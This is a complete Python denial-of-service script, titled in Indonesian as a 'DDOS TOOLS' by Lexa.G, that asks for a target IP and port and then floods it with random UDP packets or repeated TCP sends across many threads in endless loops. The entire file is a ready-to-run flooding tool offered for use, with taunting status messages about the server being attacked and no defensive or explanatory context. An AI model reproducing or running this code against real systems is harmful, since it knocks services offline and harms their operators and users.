#!/usr/bin/env python3
#Code by Rence
import random
import socket
import threading

print("~~~ DDOS TOOLS BY LEXA.G ~~~")
print("~~~ Gunakan Dengan Bijak ~~~")
ip = str(input(" Ip Server:"))
port = int(input(" Port Server:"))
choice = str(input(" Apakah Siap Memberi Paket?(y/n):"))
times = int(input(" Paket yang dikirim ke target:"))
threads = int(input(" Hadiah yang ingin diberi:"))
def run():
	data = random._urandom(1024)
	D = random.choice(("[Lexa.g]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(D +" SERVER SEDANG DI ATTACK YAHAHA")
		except:
			print("gagal tod:(")

def run2():
	data = random._urandom(16)
	D = random.choice(("[Lexa.g"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(D +" SERVER SEDANG DI ATTACK YAHAHA")
		except:
			s.close()
			print("gagal tod:(")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
